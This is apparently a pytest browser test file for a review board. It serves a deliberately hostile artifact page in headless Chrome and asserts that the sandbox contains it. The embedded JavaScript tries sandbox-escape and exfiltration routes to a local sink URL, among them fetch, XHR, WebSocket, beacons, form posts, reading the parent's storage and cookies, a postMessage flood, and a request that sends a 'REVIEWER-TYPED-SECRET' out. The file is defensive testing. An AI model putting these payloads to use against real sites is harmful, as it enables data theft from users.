"""A hostile artifact page in a real browser. The page is the attacker: it tries to leave its sandbox every way this
module covers. A local listener on a scratch port is the exfil sink; every case must be contained, which means the
sink saw no request at all, the board kept its URL and its state, and nothing was submitted. One headless Chrome (its
own process group, deleted in `finally`) runs the whole scenario once; each case is then a test of its own.

The cases that need no browser (a 50 MB data: URI, the null-origin POST) run without one."""
import base64
import json
import os
import re
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import pytest

import browserkit as bc
from conftest import http
from browserkit import BrowserUnavailable, Observer
from mockreview import api, config, server as board_server, store

pytestmark = pytest.mark.browser

ORIGIN = {"platform": "discord", "chat_id": "1490000000000000001", "thread_id": "1490000000000000001"}
CASES = ["top_navigation", "fetch", "xhr", "websocket", "eventsource", "img", "script_tag", "stylesheet_import", "iframe",
         "media", "send_beacon", "form_post", "window_open", "link_click", "post_to_the_board", "parent_document",
         "parent_storage", "cookie", "local_storage", "use_hook"]

# Each case reports what it saw into window.R[name]. A case that "succeeded" at leaving the sandbox shows up there as
# "reached"; the sink and the board's own state are the ground truth either way.
HOSTILE = """<!doctype html><html><body><h1 id="h">hostile</h1>
<script>
var SINK = '__SINK__', BOARD = '__BOARD__', ID = '__ID__';
window.R = {}; window.DONE = false;
function rec(k, v) { window.R[k] = v; }
function sync(k, fn) { try { rec(k, fn()); } catch (e) { rec(k, 'threw:' + (e && e.name)); } }
function later(k, fn) { return new Promise(function (ok) { try { fn(function (v) { rec(k, v); ok(); }); } catch (e) { rec(k, 'threw:' + (e && e.name)); ok(); } }); }
function flood() {
  try {
    for (var i = 0; i < 3000; i++) {
      parent.postMessage({__mockreview: 1, type: 'click', x: 0.5, y: 0.5, cx: 10, cy: 10}, '*');
      parent.postMessage({__mockreview: 1, type: 'hello', h: 1e9 + i}, '*');
      parent.postMessage({__mockreview: 1, type: 'submit', round: 1, token: 'x', feedback: {}}, '*');
      parent.postMessage({__mockreview: 1, type: 'pin', i: i % 5, cx: 1, cy: 1}, '*');
    }
    rec('flood', 'sent');
  } catch (e) { rec('flood', 'threw:' + e.name); }
}
window.addEventListener('message', function () { if (!window.__reflood) { window.__reflood = 1; setTimeout(function () { flood(); window.__reflood = 0; }, 50); } });
(async function () {
  sync('top_navigation', function () { top.location = SINK + '/top'; return 'assigned'; });
  await later('fetch', function (d) { fetch(SINK + '/fetch', {mode: 'no-cors'}).then(function () { d('reached'); }, function (e) { d('rejected:' + e.name); }); });
  await later('xhr', function (d) { var x = new XMLHttpRequest(); x.onload = function () { d('reached'); }; x.onerror = function () { d('error'); }; x.open('GET', SINK + '/xhr'); x.send(); });
  await later('websocket', function (d) { var w = new WebSocket(SINK.replace('http', 'ws') + '/ws'); w.onopen = function () { d('reached'); }; w.onerror = function () { d('error'); }; });
  await later('eventsource', function (d) { var e = new EventSource(SINK + '/es'); e.onopen = function () { d('reached'); }; e.onerror = function () { d('error'); e.close(); }; });
  await later('img', function (d) { var i = new Image(); i.onload = function () { d('reached'); }; i.onerror = function () { d('blocked'); }; i.src = SINK + '/img'; });
  await later('script_tag', function (d) { var s = document.createElement('script'); s.onload = function () { d('reached'); }; s.onerror = function () { d('blocked'); }; s.src = SINK + '/s.js'; document.head.appendChild(s); });
  await later('stylesheet_import', function (d) { var l = document.createElement('link'); l.rel = 'stylesheet'; l.onload = function () { d('reached'); }; l.onerror = function () { d('blocked'); }; l.href = SINK + '/c.css'; document.head.appendChild(l);
    var st = document.createElement('style'); st.textContent = '@import url(' + SINK + '/i.css); body{background:url(' + SINK + '/bg.png)}'; document.head.appendChild(st); });
  await later('iframe', function (d) { var f = document.createElement('iframe'); f.onload = function () { d('loaded'); }; f.src = SINK + '/frame'; document.body.appendChild(f); setTimeout(function () { d('no-load-event'); }, 800); });
  await later('media', function (d) { var v = document.createElement('video'); v.onloadedmetadata = function () { d('reached'); }; v.onerror = function () { d('blocked'); }; v.src = SINK + '/v.mp4'; document.body.appendChild(v);
    var a = new Audio(SINK + '/a.wav'); a.onerror = function () {}; });
  sync('send_beacon', function () { return String(navigator.sendBeacon(SINK + '/beacon', 'x')); });
  sync('form_post', function () { var f = document.createElement('form'); f.method = 'post'; f.action = SINK + '/form'; var i = document.createElement('input'); i.name = 'a'; i.value = 'b'; f.appendChild(i); document.body.appendChild(f); f.submit(); return 'submitted'; });
  sync('window_open', function () { var w = window.open(SINK + '/open'); return w ? 'opened' : 'null'; });
  sync('link_click', function () { var a = document.createElement('a'); a.href = SINK + '/link'; a.target = '_blank'; document.body.appendChild(a); a.click(); return 'clicked'; });
  await later('post_to_the_board', function (d) { fetch(BOARD + '/r/' + ID + '/api/submit', {method: 'POST', mode: 'no-cors', body: '{}'}).then(function () { d('reached'); }, function (e) { d('rejected:' + e.name); }); });
  sync('parent_document', function () { return typeof parent.document.body; });
  sync('parent_storage', function () { return typeof parent.localStorage.length; });
  sync('cookie', function () { return document.cookie; });
  sync('local_storage', function () { return String(localStorage.length); });
  sync('use_hook', function () {
    var before = window.mockreview, r = window.mockreview.use('anything'), d = window.mockreview.use('data');
    try { window.mockreview = {use: function () { return 'hijacked'; }}; } catch (e) {}
    return JSON.stringify({isNull: r === null, dataObject: !!d && typeof d === 'object' && typeof d.get === 'function',
      same: window.mockreview === before, frozen: Object.isFrozen(before)});
  });
  flood();
  window.DONE = true;
})();
</script></body></html>"""


class Sink:
    """A listener that records every request made to it, of any method, and every raw connection."""

    def __init__(self):
        self.requests = []
        outer = self

        class H(BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def _any(self):
                outer.requests.append((self.command, self.path, self.headers.get("Upgrade", "")))
                self.send_response(200)
                self.send_header("Content-Length", "0")
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()

            do_GET = do_POST = do_PUT = do_HEAD = do_OPTIONS = _any

        self.httpd = ThreadingHTTPServer(("127.0.0.1", 0), H)
        self.url = f"http://127.0.0.1:{self.httpd.server_address[1]}"
        threading.Thread(target=self.httpd.serve_forever, kwargs={"poll_interval": 0.05}, daemon=True).start()

    def close(self):
        self.httpd.shutdown()
        self.httpd.server_close()


class Recorder(Observer):
    """Every request any frame of the browser started, with its method and how it ended (the stock Observer keeps only
    the URL). `ended[(session, id)]` is "blocked:<reason>", "failed:<error>", "answered:<status>" or absent (pending)."""

    def __init__(self):
        super().__init__()
        self.log = []
        self.ended = {}

    def handle(self, msg):
        method, p, sid = msg.get("method"), msg.get("params") or {}, msg.get("sessionId") or ""
        key = (sid, p.get("requestId", ""))
        if method == "Network.requestWillBeSent":
            req = p.get("request") or {}
            self.log.append((req.get("method", ""), req.get("url", ""), key))
        elif method == "Network.responseReceived":
            self.ended[key] = f"answered:{(p.get('response') or {}).get('status')}"
        elif method == "Network.loadingFailed":
            self.ended[key] = (f"blocked:{p.get('blockedReason')}" if p.get("blockedReason") else f"failed:{p.get('errorText')}")
        super().handle(msg)

    def outcome(self, key):
        # a frame's request starts in the page session and may end in the frame's own: match on the request id alone
        return self.ended.get(key) or next((v for (s, r), v in self.ended.items() if r == key[1]), "pending")


@pytest.fixture(scope="module")
def scenario(tmp_path_factory):
    """Run the hostile page once. Returns what the page reported, what the sink and the board server saw and the
    board's own state before and after. Skips (never passes) when no browser is installed."""
    try:
        bc.find_browser()
    except BrowserUnavailable as e:
        pytest.skip(e.message)
    tmp = tmp_path_factory.mktemp("hostile")
    mp = pytest.MonkeyPatch()
    for k, v in (("HOME", tmp / "home"), ("HERMES_HOME", tmp / "hermes"), ("MOCKREVIEW_HOME", tmp / "data"),
                 ("MOCKREVIEW_CONFIG", tmp / "no-config.yaml")):
        mp.setenv(k, str(v))
    mp.setenv("MOCKREVIEW_OWNER", "self")
    mp.setenv("MOCKREVIEW_PUBLIC_BASE", "https://board.example.test:8790")
    posts = []
    real_post = board_server.Handler.do_POST

    def counted(self):
        posts.append((self.path, self.headers.get("Origin")))
        return real_post(self)

    mp.setattr(board_server.Handler, "do_POST", counted)
    sink = Sink()
    httpd = board_server.make_server("127.0.0.1", 0)
    threading.Thread(target=httpd.serve_forever, kwargs={"poll_interval": 0.05}, daemon=True).start()
    board = f"http://127.0.0.1:{httpd.server_address[1]}"
    out = {}
    try:
        f = tmp / "dec" / "decisions.json"
        f.parent.mkdir()
        # the id is not known until the review exists; the page learns it from the round it is created in
        f.write_text(json.dumps({"blocks": [{"type": "artifact", "id": "evil", "title": "Evil", "html": "<p>x</p>", "markable": True}]}),
                     encoding="utf-8")
        data = store.create_review("hostile", "", ORIGIN, "tailscale", store.parse_round_spec(decisions=str(f)))
        rid = data["id"]
        page = HOSTILE.replace("__SINK__", sink.url).replace("__BOARD__", board).replace("__ID__", rid)
        served = config.data_root() / rid / "rounds/1/a/blocks/evil.html"
        served.write_text(store.artifact_page(page), encoding="utf-8")     # exactly what the store would serve
        control = http("GET", sink.url + "/control")                       # the sink does record
        assert control[0] == 200 and sink.requests == [("GET", "/control", "")]
        url = f"{board}/r/{rid}/"

        def bring_up(live):
            cdp = live.cdp
            sink.requests.clear()
            del posts[:]
            tid = cdp.call("Target.createTarget", {"url": "about:blank"})["targetId"]
            sid = cdp.call("Target.attachToTarget", {"targetId": tid, "flatten": True})["sessionId"]
            for m, p in (("Page.enable", {}), ("Network.enable", {}), ("Runtime.enable", {}),
                         ("Network.setCacheDisabled", {"cacheDisabled": True}),
                         ("Target.setAutoAttach", {"autoAttach": True, "waitForDebuggerOnStart": True, "flatten": True}),
                         ("Emulation.setDeviceMetricsOverride", {"width": 1280, "height": 900, "deviceScaleFactor": 1, "mobile": False})):
                cdp.call(m, p, session=sid)
            return sid

        def body(live, sid):
            cdp, rec = live.cdp, live.observer
            deadline = time.monotonic() + 40

            def top(expr):
                return cdp.evaluate(expr, session=sid)

            def frame_ctx():
                for fid, (u, _) in list(rec.frames.items()):
                    if u.split("?", 1)[0].endswith("blocks/evil.html") and fid in rec.contexts:
                        return rec.contexts[fid]
                return None

            def in_frame(expr):
                ctx = frame_ctx()
                return cdp.evaluate(expr, session=ctx[0] or sid, context=ctx[1]) if ctx else None

            cdp.call("Page.navigate", {"url": url}, session=sid)
            assert cdp.wait(lambda: top("document.querySelectorAll('iframe.art-frame').length") == 1, deadline, 0.3), "no artifact frame"
            # Comment mode starts off; turn it on so the attacks below also run against pin (comment) mode. The
            # toggle pushes a state message, which wakes the page's own flood.
            top("document.getElementById('comment-toggle').click()")
            assert top("document.body.classList.contains('tool-comment')") is True, "comment mode did not turn on"
            assert cdp.wait(lambda: in_frame("window.DONE === true") is True, deadline, 0.3), "the hostile page never finished"
            cdp.wait(lambda: False, time.monotonic() + 2.5)               # let anything slow arrive
            got = {}
            got["report"] = json.loads(in_frame("JSON.stringify(window.R)") or "{}")
            got["frame_attrs"] = top("(function(f){return JSON.stringify({sandbox:f.getAttribute('sandbox'),src:f.getAttribute('src'),srcdoc:f.getAttribute('srcdoc'),h:f.style.height})})(document.querySelector('iframe.art-frame'))")
            got["url_after_attacks"] = top("location.href")
            got["responsive"] = top("1 + 1") == 2 and top("document.querySelectorAll('.blk').length") >= 1
            got["popovers_in_pin_mode"] = top("document.querySelectorAll('.popover').length")
            got["height_after_flood"] = top("document.querySelector('iframe.art-frame').style.height")
            # Tap mode: a forged tap must now open nothing, even when the page floods again (the board's tool change
            # pushes a state message, which wakes the page's own flood)
            top("document.getElementById('comment-toggle').click()")          # Exit comment == the old Tap
            assert top("document.body.classList.contains('tool-comment')") is False, "comment mode did not turn off"
            cdp.wait(lambda: False, time.monotonic() + 2.5)
            got["popovers_in_tap_mode"] = top("document.querySelectorAll('.popover').length")
            got["still_responsive"] = top("2 * 3") == 6
            got["url_end"] = top("location.href")
            got["drafts"] = top("JSON.stringify(Object.keys(localStorage).filter(function(k){return /draft/.test(k)}).map(function(k){return JSON.parse(localStorage.getItem(k)).pins}))")
            got["requests"] = [(m, u, rec.outcome(k)) for m, u, k in rec.log]
            return got

        out = bc.with_live_browser(bring_up, body, Recorder)
        out.update(url=url, sink_url=sink.url, sink=list(sink.requests), posts=list(posts), rid=rid, board=board, tmp=str(tmp))
        out["submission"] = store.load(rid)["rounds"][0].get("submission")
        out["health"] = http("GET", board + "/healthz")[0]
        yield out
    finally:
        httpd.shutdown()
        httpd.server_close()
        sink.close()
        mp.undo()


@pytest.mark.parametrize("name", CASES)
def test_every_attack_was_attempted_and_none_reached_anything(scenario, name):
    got = scenario["report"].get(name)
    assert got is not None, f"{name}: the hostile page never reached this case"
    assert "reached" not in str(got) and "opened" != got, f"{name}: {got}"


def test_the_exfil_sink_saw_zero_requests(scenario):
    assert scenario["sink"] == []


def test_the_browser_blocked_every_attempt_at_the_sink_itself(scenario):
    """The sink saw nothing; this is why: each attempt the browser logged toward it ended blocked or failed, never answered."""
    toward = [r for r in scenario["requests"] if r[1].startswith(scenario["sink_url"])]
    assert all(not o.startswith("answered") for _, _, o in toward), toward
    assert all(o.startswith(("blocked:", "failed:")) for _, _, o in toward), toward


def test_the_board_page_was_not_navigated_by_top_location(scenario):
    assert scenario["url_after_attacks"] == scenario["url"] == scenario["url_end"]


def test_the_frame_is_exactly_the_sandboxed_served_file(scenario):
    a = json.loads(scenario["frame_attrs"])
    assert a["sandbox"] == "allow-scripts" and a["srcdoc"] is None
    assert re.fullmatch(r"rounds/1/~[^/]+/a/blocks/evil\.html", a["src"]), a["src"]


def test_the_page_could_not_read_the_boards_dom_cookies_or_storage(scenario):
    r = scenario["report"]
    assert r["parent_document"] == "threw:SecurityError" and r["parent_storage"] == "threw:SecurityError"
    assert r["cookie"] == "threw:SecurityError" and r["local_storage"] == "threw:SecurityError"


def test_the_use_hook_exists_serves_data_returns_null_otherwise_and_cannot_be_replaced(scenario):
    assert json.loads(scenario["report"]["use_hook"]) == {"isNull": True, "dataObject": True, "same": True, "frozen": True}


def test_a_postmessage_flood_leaves_the_board_responsive_and_nothing_submitted(scenario):
    assert scenario["responsive"] and scenario["still_responsive"] and scenario["health"] == 200
    assert scenario["posts"] == [] and scenario["submission"] is None
    posted = [r for r in scenario["requests"] if r[0] == "POST"]
    assert all(not o.startswith("answered") for _, _, o in posted), posted
    assert int(scenario["height_after_flood"].rstrip("px")) <= 4000          # auto-height followed the cap, not 1e9


def test_a_forged_tap_opens_no_draft_in_tap_mode_and_at_most_one_in_pin_mode_and_saves_nothing(scenario):
    assert scenario["popovers_in_tap_mode"] == 0
    assert scenario["popovers_in_pin_mode"] <= 1
    drafts = json.loads(scenario["drafts"])
    assert all(p == [] for p in drafts), drafts                               # a draft popover is not a pin until a person saves it


def test_post_with_origin_null_to_submit_is_403_and_the_server_survives(scenario):
    url = f"{scenario['board']}/r/{scenario['rid']}/api/submit"
    body = {"round": 1, "token": "x", "feedback": {"marks": {}, "pins": [], "guidelines": ""}}
    code, _, _ = http("POST", url, body, {"Origin": "null"})
    assert code == 403
    assert http("GET", scenario["board"] + "/healthz")[0] == 200


# ---------------------------------------------------------------- a page that navigates its own frame

# A beacon page: what a navigated document would do with a network. It also reports, into window.R2, what it saw.
BEACON = """<!doctype html><html><body><p>beacon</p>
<script>
var SINK = '__SINK__'; window.R2 = {}; window.DONE2 = false;
function rec(k, v) { window.R2[k] = v; }
__FORGE__
fetch(SINK + '/escaped-fetch?artifact_data=456', {mode: 'no-cors'}).then(function () { rec('fetch', 'reached'); }, function (e) { rec('fetch', 'rejected:' + e.name); });
var x = new XMLHttpRequest(); x.onload = function () { rec('xhr', 'reached'); }; x.onerror = function () { rec('xhr', 'error'); };
x.open('GET', SINK + '/escaped-xhr'); x.send();
var i = new Image(); i.onload = function () { rec('img', 'reached'); }; i.onerror = function () { rec('img', 'blocked'); }; i.src = SINK + '/escaped-img';
try { rec('beacon', String(navigator.sendBeacon(SINK + '/escaped-beacon', 'x'))); } catch (e) { rec('beacon', 'threw:' + e.name); }
var s = document.createElement('script'); s.onload = function () { rec('script', 'reached'); }; s.onerror = function () { rec('script', 'blocked'); };
s.src = SINK + '/escaped.js'; document.head.appendChild(s);
var f = document.createElement('iframe'); f.src = SINK + '/escaped-frame'; document.body.appendChild(f);
setTimeout(function () { window.DONE2 = true; }, 1200);
</script></body></html>"""
FORGE = "setInterval(function () { try { parent.postMessage({__mockreview: 1, type: 'hello', h: 100}, '*'); } catch (e) {} }, 50);"


@pytest.fixture(scope="module")
def navigation(tmp_path_factory):
    """Three artifacts whose pages navigate their own frame: to a beacon page of the same round (assets/), to the same page
    when it also forges the probe's hello, and to a third-party URL (the sink). One Chrome, replaced if it dies."""
    try:
        bc.find_browser()
    except BrowserUnavailable as e:
        pytest.skip(e.message)
    tmp = tmp_path_factory.mktemp("navigate")
    mp = pytest.MonkeyPatch()
    for k, v in (("HOME", tmp / "home"), ("HERMES_HOME", tmp / "hermes"), ("MOCKREVIEW_HOME", tmp / "data"),
                 ("MOCKREVIEW_CONFIG", tmp / "no-config.yaml")):
        mp.setenv(k, str(v))
    mp.setenv("MOCKREVIEW_OWNER", "self")
    mp.setenv("MOCKREVIEW_PUBLIC_BASE", "https://board.example.test:8790")
    sink = Sink()
    httpd = board_server.make_server("127.0.0.1", 0)
    threading.Thread(target=httpd.serve_forever, kwargs={"poll_interval": 0.05}, daemon=True).start()
    board = f"http://127.0.0.1:{httpd.server_address[1]}"
    out = {}
    try:
        d = tmp / "dec"
        (d / "assets").mkdir(parents=True)
        (d / "assets" / "escape.html").write_text(BEACON.replace("__SINK__", sink.url).replace("__FORGE__", ""), encoding="utf-8")
        (d / "assets" / "escape-forged.html").write_text(BEACON.replace("__SINK__", sink.url).replace("__FORGE__", FORGE), encoding="utf-8")
        (d / "assets" / "pixel.png").write_bytes(base64.b64decode(
            "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=="))
        blocks = [{"type": "artifact", "id": "navself", "html": "<p>self</p><script>location.href = '../assets/escape.html';</script>"},
                  {"type": "artifact", "id": "navforge", "html": "<p>forge</p><script>location.href = '../assets/escape-forged.html';</script>"},
                  {"type": "artifact", "id": "navthird", "html": "<p>third</p><script>location.href = '" + sink.url + "/third-party';</script>"},
                  {"type": "mock", "id": "plain", "html": "<img id=px alt=px src=\"rounds/1/a/assets/pixel.png\"><p>plain</p>"}]
        (d / "decisions.json").write_text(json.dumps({"blocks": blocks}), encoding="utf-8")
        data = store.create_review("navigate", "", ORIGIN, "tailscale", store.parse_round_spec(decisions=str(d / "decisions.json")))
        rid = data["id"]
        url = f"{board}/r/{rid}/"

        def bring_up(live):
            cdp = live.cdp
            sink.requests.clear()
            tid = cdp.call("Target.createTarget", {"url": "about:blank"})["targetId"]
            sid = cdp.call("Target.attachToTarget", {"targetId": tid, "flatten": True})["sessionId"]
            for m, p in (("Page.enable", {}), ("Network.enable", {}), ("Runtime.enable", {}),
                         ("Network.setCacheDisabled", {"cacheDisabled": True}),
                         ("Target.setAutoAttach", {"autoAttach": True, "waitForDebuggerOnStart": True, "flatten": True}),
                         ("Emulation.setDeviceMetricsOverride", {"width": 1280, "height": 1400, "deviceScaleFactor": 1, "mobile": False})):
                cdp.call(m, p, session=sid)
            return sid

        def body(live, sid):
            cdp, rec = live.cdp, live.observer
            deadline = time.monotonic() + 45

            def top(expr):
                return cdp.evaluate(expr, session=sid)

            def in_frame(suffix, expr):
                for fid, (u, _) in list(rec.frames.items()):
                    if u.split("?", 1)[0].endswith(suffix) and fid in rec.contexts:
                        ctx = rec.contexts[fid]
                        return cdp.evaluate(expr, session=ctx[0] or sid, context=ctx[1])
                return None

            cdp.call("Page.navigate", {"url": url}, session=sid)
            assert cdp.wait(lambda: top("document.querySelectorAll('iframe.art-frame').length") >= 1, deadline, 0.3), "no artifact frame"
            # What the waits find is data, not a precondition: each test below judges its own part (so each fails by itself
            # when the containment is missing). The forged-hello page stays where it navigated and runs its beacons; the
            # honest page is reset to its block file three times (about a second each) and then dropped.
            cdp.wait(lambda: in_frame("assets/escape-forged.html", "window.DONE2 === true") is True, time.monotonic() + 15, 0.3)
            cdp.wait(lambda: top("document.querySelector('[data-id=navself] .art-missing') !== null") is True, time.monotonic() + 12, 0.3)
            cdp.wait(lambda: False, time.monotonic() + 1.5)
            got = {}
            got["forged_report"] = json.loads(in_frame("assets/escape-forged.html", "JSON.stringify(window.R2)") or "{}")
            got["forged_frame_src"] = top("(function(f){return f.getAttribute('src')})(document.querySelector('[data-id=navforge] iframe'))")
            got["self_frames"] = top("document.querySelectorAll('[data-id=navself] iframe').length")
            got["self_text"] = top("(document.querySelector('[data-id=navself] .art-missing') || {}).textContent || ''")
            got["third_frames"] = top("document.querySelectorAll('[data-id=navthird] iframe').length")
            got["third_text"] = top("(document.querySelector('[data-id=navthird] .art-missing') || {}).textContent || ''")
            got["plain_image"] = top("(function(h){var i = h && h.shadowRoot && h.shadowRoot.querySelector('img'); return i ? (i.complete && i.naturalWidth) : 'no image'})(document.querySelector('#dz-plain .mock-host'))")
            got["url_end"] = top("location.href")
            got["responsive"] = top("6 * 7") == 42
            got["requests"] = [(m, u, rec.outcome(k)) for m, u, k in rec.log]
            return got

        out = bc.with_live_browser(bring_up, body, Recorder)
        out.update(url=url, sink_url=sink.url, sink=list(sink.requests), rid=rid, board=board)
        out["submission"] = store.load(rid)["rounds"][0].get("submission")
        yield out
    finally:
        httpd.shutdown()
        httpd.server_close()
        sink.close()
        mp.undo()


def test_self_navigation_to_a_beacon_page_of_the_round_and_to_a_third_party_url_reaches_the_sink_zero_times(navigation):
    assert navigation["sink"] == []
    toward = [r for r in navigation["requests"] if r[1].startswith(navigation["sink_url"])]
    assert all(not o.startswith("answered") for _, _, o in toward), toward


def test_the_beacon_page_the_frame_navigated_to_found_every_channel_closed(navigation):
    r = navigation["forged_report"]
    assert r, "the beacon page reported nothing"
    assert r["fetch"].startswith("rejected") and r["xhr"] == "error" and r["img"] == "blocked" and r["script"] == "blocked", r


def test_a_page_that_forges_the_probe_hello_stays_on_its_beacon_page_and_is_still_contained(navigation):
    """Reset (the board's ping) only catches a document that does not answer; the header is what holds when one does."""
    assert re.fullmatch(r"rounds/1/~[^/]+/a/blocks/navforge\.html", navigation["forged_frame_src"]), \
        navigation["forged_frame_src"]       # the board did not re-point it: it answered
    assert navigation["sink"] == [] and navigation["forged_report"]["fetch"].startswith("rejected")


def test_a_frame_that_keeps_navigating_away_is_reset_a_few_times_and_then_dropped(navigation):
    assert navigation["self_frames"] == 0 and "did not stay on its own file" in navigation["self_text"]
    own = [r for r in navigation["requests"] if r[0] == "GET"
           and re.search(r"rounds/1/(?:~[^/]+/)?a/blocks/navself\.html$", r[1])]
    assert 1 < len(own) <= 1 + 3, own                    # the first load, then at most ART.resets reloads
    escapes = [r for r in navigation["requests"] if re.search(r"rounds/1/(?:~[^/]+/)?a/assets/escape\.html$", r[1])]
    assert 1 <= len(escapes) <= 1 + 3, escapes


def test_a_third_party_url_the_frame_navigates_to_is_never_requested_and_the_frame_is_not_left_there(navigation):
    assert [r for r in navigation["sink"] if r[1].startswith("/third-party")] == []
    third = [r for r in navigation["requests"] if r[1].startswith(navigation["sink_url"] + "/third-party")]
    assert all(not o.startswith("answered") for _, _, o in third), third
    # the board's own frame-src 'self' already refuses the navigation (no request is made); what is new is that the dead frame
    # (the browser's error page: no probe, so no answer to the ping) is dropped instead of being left in the board
    assert navigation["third_frames"] == 0 and "did not stay on its own file" in navigation["third_text"]


def test_the_board_stayed_put_and_plain_mock_media_still_loads_under_the_round_header(navigation):
    assert navigation["url_end"] == navigation["url"] and navigation["responsive"] and navigation["submission"] is None
    assert navigation["plain_image"] == 1                # a header CSP on an image is ignored by the browser: it loads


def test_the_beacon_page_is_served_with_the_artifact_grade_header(navigation):
    """The stricter header on exactly the file the frame navigated to (it is not the block file: it has no meta CSP)."""
    code, h, body = http("GET", f"{navigation['board']}/r/{navigation['rid']}/rounds/1/a/assets/escape.html")
    assert code == 200 and b"http-equiv" not in body
    assert h["Content-Security-Policy"] == "sandbox allow-scripts; " + store.ARTIFACT_CSP
    assert "connect-src 'none'" in h["Content-Security-Policy"]


# ---------------------------------------------------------------- a prototype round in a review that has an artifact

# Round 1 is a prototype page: its own script wants the sink, and reports what it saw (and whether its own image
# loaded) to the board window. Round 2's artifact navigates its sandboxed frame to that page.
PROTO_ROUND1 = """<!doctype html><html><head><style>
html,body{margin:0;min-height:700px}#still{position:absolute;left:20px;top:20px;width:32px;height:32px}
#copy{position:absolute;left:20px;top:80px;width:320px;height:80px;font:16px sans-serif}
</style></head><body>
<img id="still" alt="still" src="assets/still.png"><p id="copy" data-mr-part="copy">Prototype copy</p>
<script>
var out = {href: location.href, img: 0, fetch: 'pending'};
function report() {
  var im = document.getElementById('still');
  out.href = location.href;
  out.img = im && im.complete ? im.naturalWidth : 0;
  parent.postMessage({fixture: 'round1', href: out.href, img: out.img, fetch: out.fetch}, '*');
}
fetch('__SINK__/exfil?d=REVIEWER-TYPED-SECRET').then(function () { out.fetch = 'reached'; report(); },
  function (e) { out.fetch = 'blocked:' + ((e && e.name) || e); report(); });
var im = document.getElementById('still');
im.addEventListener('load', report); im.addEventListener('error', report);
setTimeout(report, 1500);
</script></body></html>"""

# Reports from the artifact frame and from the page-mode frame are kept apart by their source window, so a late
# artifact report can never be mistaken for page-mode evidence.
RECORD_ROUND1 = ("window.__round1=[];window.__round1_page=[];"
                 "addEventListener('message',function(e){"
                 "if(!(e.data&&e.data.fixture==='round1'))return;"
                 "var f=document.querySelector('.proto iframe');"
                 "(f&&e.source===f.contentWindow?window.__round1_page:window.__round1).push(e.data);});")


@pytest.fixture(scope="module")
def cross_round(tmp_path_factory):
    """Round 1 is a prototype page, round 2 an artifact that navigates its frame to it. One Chrome, replaced if it
    dies; the fixture only collects what the pages reported, so each test below judges its own part."""
    try:
        bc.find_browser()
    except BrowserUnavailable as e:
        pytest.skip(e.message)
    tmp = tmp_path_factory.mktemp("cross-round")
    mp = pytest.MonkeyPatch()
    for k, v in (("HOME", tmp / "home"), ("HERMES_HOME", tmp / "hermes"), ("MOCKREVIEW_HOME", tmp / "data"),
                 ("MOCKREVIEW_CONFIG", tmp / "no-config.yaml")):
        mp.setenv(k, str(v))
    mp.setenv("MOCKREVIEW_OWNER", "self")
    mp.setenv("MOCKREVIEW_PUBLIC_BASE", "https://board.example.test:8790")
    sink = Sink()
    httpd = board_server.make_server("127.0.0.1", 0)
    threading.Thread(target=httpd.serve_forever, kwargs={"poll_interval": 0.05}, daemon=True).start()
    board = f"http://127.0.0.1:{httpd.server_address[1]}"
    out = {}
    try:
        proto = tmp / "proto"
        (proto / "assets").mkdir(parents=True)
        (proto / "assets" / "still.png").write_bytes(base64.b64decode(
            "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=="))
        (proto / "index.html").write_text(PROTO_ROUND1.replace("__SINK__", sink.url), encoding="utf-8")
        data = store.create_review("Mixed", "", ORIGIN, "tailscale", store.parse_round_spec(prototype=str(proto / "index.html")))
        rid = data["id"]
        art = tmp / "art"
        art.mkdir()
        art_page = ('<p>artifact</p><script>location.href = ' +
                    json.dumps(f"/r/{rid}/rounds/1/a/index.html") + ';</script>')
        (art / "decisions.json").write_text(json.dumps({"blocks": [{"type": "artifact", "id": "nav", "html": art_page}]}),
                                            encoding="utf-8")
        store.add_round(rid, store.parse_round_spec(decisions=str(art / "decisions.json")))

        def bring_up(live):
            cdp = live.cdp
            sink.requests.clear()
            tid = cdp.call("Target.createTarget", {"url": "about:blank"})["targetId"]
            sid = cdp.call("Target.attachToTarget", {"targetId": tid, "flatten": True})["sessionId"]
            for m, p in (("Page.enable", {}), ("Network.enable", {}), ("Runtime.enable", {}),
                         ("Network.setCacheDisabled", {"cacheDisabled": True}),
                         ("Target.setAutoAttach", {"autoAttach": True, "waitForDebuggerOnStart": True, "flatten": True}),
                         ("Emulation.setDeviceMetricsOverride", {"width": 1280, "height": 1000, "deviceScaleFactor": 1,
                                                                 "mobile": False})):
                cdp.call(m, p, session=sid)
            cdp.call("Page.addScriptToEvaluateOnNewDocument", {"source": RECORD_ROUND1}, session=sid)
            return sid

        def body(live, sid):
            cdp = live.cdp
            deadline = time.monotonic() + 45

            def top(expr):
                return cdp.evaluate(expr, session=sid)

            MATCH = "m.href.indexOf('/rounds/1/') >= 0 && m.href.indexOf('/a/index.html') >= 0"
            IMAGE = "m.img === 1"
            BLOCKED = "typeof m.fetch === 'string' && /^(blocked|rejected)/.test(m.fetch)"

            def frame_report(cond):
                return top("(window.__round1||[]).some(function(m){return " + MATCH + " && (" + cond + ")})")

            def page_report(cond):
                return top("(window.__round1_page||[]).some(function(m){return " + MATCH + " && (" + cond + ")})")

            cdp.call("Page.navigate", {"url": f"{board}/r/{rid}/"}, session=sid)
            assert cdp.wait(lambda: top("document.querySelectorAll('iframe.art-frame').length") == 1,
                            deadline, 0.3), "no artifact frame"
            # Round 1 posts several reports (the fetch rejection usually lands before the image load): wait for the
            # settled pair, then record that evidence, never the first matching message.
            cdp.wait(lambda: frame_report(IMAGE) and frame_report(BLOCKED), deadline, 0.3)
            got = {}
            got["frame_img"] = int(bool(frame_report(IMAGE)))
            got["frame_blocked"] = bool(frame_report(BLOCKED))
            got["sink_in_artifact_frame"] = list(sink.requests)   # before page mode loads the same page with a token
            # Now switch to round 1 in the same board: page mode loads the same prototype page on its own.
            top("Array.prototype.find.call(document.querySelectorAll('.round-tab'),"
                "function(e){return e.textContent.trim()==='R1'}).click()")
            cdp.wait(lambda: page_report(IMAGE), deadline, 0.3)
            got["page_img"] = int(bool(page_report(IMAGE)))
            got["url_end"] = top("location.href")
            got["sink"] = list(sink.requests)
            return got

